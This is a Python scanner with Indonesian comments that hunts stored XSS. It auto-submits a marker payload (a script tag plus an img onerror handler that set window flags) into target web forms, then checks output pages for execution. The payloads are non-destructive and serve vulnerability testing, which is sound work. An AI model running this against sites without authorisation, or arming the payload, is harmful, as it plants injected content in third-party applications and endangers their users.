#!/usr/bin/env python3
"""
stored_xss_hunter.py — Deteksi stored XSS dengan alur: submit payload bermarker
unik ke form -> revisit halaman di mana data itu biasanya ditampilkan ->
cek apakah payload muncul TANPA di-escape (artinya berpotensi tereksekusi).

Stored XSS tidak bisa dideteksi dari satu request saja seperti reflected,
makanya butuh browser automation untuk mensimulasikan alur user sungguhan.

Ada 2 mode:
1. Mode auto-discover : script mencoba menemukan <form> di URL yang diberikan,
   isi semua field dengan payload marker, submit, lalu screenshot hasilnya.
2. Mode targeted (disarankan untuk hasil akurat) : Anda definisikan pasangan
   input_url -> output_url secara eksplisit di file targets.json, karena
   aplikasi nyata sering menyimpan input di satu halaman dan menampilkannya
   di halaman lain (profile, dashboard, komentar publik, dst).

Usage:
    python3 stored_xss_hunter.py --targets targets.json --output stored_results.json

Contoh targets.json:
[
  {
    "name": "comment_form",
    "input_url": "https://target.com/post/123",
    "form_selector": "form#comment-form",
    "output_url": "https://target.com/post/123",
    "wait_after_submit_ms": 2000
  }
]
"""

import argparse
import json
import time
import uuid
from pathlib import Path

from playwright.sync_api import sync_playwright

MARKER_PREFIX = "sxssmark"

# Payload non-destruktif: set variabel global window kalau tereksekusi,
# TIDAK memanggil alert() supaya tidak mengganggu/ke-block popup blocker saat
# batch testing. Verifikasi dilakukan lewat window flag + textual check.
def build_payload(token: str) -> str:
    return (
        f'<script>window["{MARKER_PREFIX}_{token}"]=true;</script>'
        f'<img src=x onerror="window[\'{MARKER_PREFIX}_{token}_img\']=true">'
    )


def fill_and_submit_form(page, form_selector: str, payload: str):
    """Isi semua field text/textarea yang ada di dalam form dengan payload,
    lalu submit."""
    form = page.query_selector(form_selector)
    if not form:
        return False, "form tidak ditemukan"

    inputs = form.query_selector_all("input[type=text], input[type=search], "
                                      "input:not([type]), textarea")
    if not inputs:
        return False, "tidak ada input field di form"

    for field in inputs:
        try:
            field.fill(payload)
        except Exception:
            continue

    submit_btn = form.query_selector(
        "button[type=submit], input[type=submit], button:not([type])"
    )
    try:
        if submit_btn:
            submit_btn.click()
        else:
            page.keyboard.press("Enter")
    except Exception as e:
        return False, f"gagal submit: {e}"

    return True, "ok"


def check_marker_on_page(page, token: str) -> dict:
    """Cek apakah marker muncul di DOM output dan apakah tereksekusi
    (window flag ke-set) atau cuma muncul sebagai teks ter-escape."""
    result = {"executed": False, "raw_html_present": False, "escaped": None}

    try:
        script_flag = page.evaluate(f'window["{MARKER_PREFIX}_{token}"] === true')
        img_flag = page.evaluate(f'window["{MARKER_PREFIX}_{token}_img"] === true')
        result["executed"] = bool(script_flag or img_flag)
    except Exception:
        pass

    content = page.content()
    if token in content:
        result["raw_html_present"] = True
        # heuristik sederhana: kalau tag <script> masih utuh (tidak di-escape
        # jadi &lt;script&gt;) berarti berpotensi tereksekusi walau flag belum
        # kebaca (mis. CSP block eksekusi tapi HTML tetap ter-inject mentah)
        result["escaped"] = f"&lt;script&gt;window[&quot;{MARKER_PREFIX}_{token}" in content \
            or "&lt;script&gt;" in content

    return result


def run_target(playwright, target: dict, timeout_ms: int, screenshot_dir: Path):
    token = uuid.uuid4().hex[:10]
    payload = build_payload(token)

    browser = playwright.chromium.launch(headless=True)
    context = browser.new_context(ignore_https_errors=True)
    page = context.new_page()
    page.set_default_timeout(timeout_ms)

    entry = {
        "name": target.get("name", token),
        "token": token,
        "input_url": target["input_url"],
        "output_url": target.get("output_url", target["input_url"]),
        "status": "unknown",
        "detail": "",
        "result": {},
    }

    try:
        page.goto(target["input_url"], wait_until="domcontentloaded")
        ok, msg = fill_and_submit_form(page, target["form_selector"], payload)
        if not ok:
            entry["status"] = "skip"
            entry["detail"] = msg
            browser.close()
            return entry

        page.wait_for_timeout(target.get("wait_after_submit_ms", 2000))

        # revisit halaman output (bisa saja sama dengan input_url tapi perlu
        # reload untuk melihat state tersimpan, bukan state form submit)
        page.goto(entry["output_url"], wait_until="domcontentloaded")
        page.wait_for_timeout(1000)

        check = check_marker_on_page(page, token)
        entry["result"] = check

        if check["executed"]:
            entry["status"] = "VULNERABLE"
            entry["detail"] = "Payload tereksekusi (window flag terset) setelah revisit"
            if target.get("screenshot", True):
                shot_path = screenshot_dir / f"stored_{entry['name']}_{token}.png"
                page.screenshot(path=str(shot_path), full_page=True)
                entry["screenshot"] = str(shot_path)
        elif check["raw_html_present"] and check["escaped"] is False:
            entry["status"] = "SUSPECTED"
            entry["detail"] = ("Payload muncul mentah di HTML tapi flag eksekusi tidak "
                                "terdeteksi (mungkin CSP block, cek manual)")
        elif check["raw_html_present"] and check["escaped"] is True:
            entry["status"] = "SAFE"
            entry["detail"] = "Payload ter-escape dengan benar oleh aplikasi"
        else:
            entry["status"] = "NOT_FOUND"
            entry["detail"] = "Marker tidak ditemukan di halaman output"

    except Exception as e:
        entry["status"] = "error"
        entry["detail"] = str(e)
    finally:
        browser.close()

    return entry


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--targets", required=True, help="File JSON daftar target form")
    ap.add_argument("--output", required=True, help="File JSON hasil")
    ap.add_argument("--timeout-ms", type=int, default=15000)
    ap.add_argument("--screenshot-dir", default="output/screenshots")
    args = ap.parse_args()

    targets = json.loads(Path(args.targets).read_text())
    screenshot_dir = Path(args.screenshot_dir)
    screenshot_dir.mkdir(parents=True, exist_ok=True)

    results = []
    with sync_playwright() as p:
        for target in targets:
            print(f"[*] Testing stored XSS: {target.get('name', target['input_url'])}")
            res = run_target(p, target, args.timeout_ms, screenshot_dir)
            print(f"    -> {res['status']}: {res['detail']}")
            results.append(res)
            time.sleep(0.5)

    Path(args.output).write_text(json.dumps(results, indent=2))
    vuln_count = sum(1 for r in results if r["status"] == "VULNERABLE")
    print(f"[✓] Selesai. {vuln_count} kemungkinan stored XSS ditemukan → {args.output}")


if __name__ == "__main__":
    main()
